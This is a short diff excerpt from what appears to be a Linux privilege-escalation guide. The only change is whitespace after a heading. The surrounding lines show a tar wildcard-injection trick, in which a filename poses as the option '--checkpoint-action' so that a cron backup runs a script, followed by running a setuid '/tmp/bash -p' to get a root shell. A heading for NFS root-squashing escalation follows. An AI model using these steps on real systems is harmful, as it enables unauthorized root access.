@@ -465,7 +465,7 @@ touch /home/user/--checkpoint-action=sh\runme.sh
 # Wait for our cron job to run, and then we should be able to execute the bash in /tmp
 /tmp/bash -p
 ```
-- **Why this works**
+- **Why this works**  
 So in this case, because of the wildcard, the system interprets this as the command `tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=sh\runme.sh
 
 # Escalation Path: NFS Root Squashing
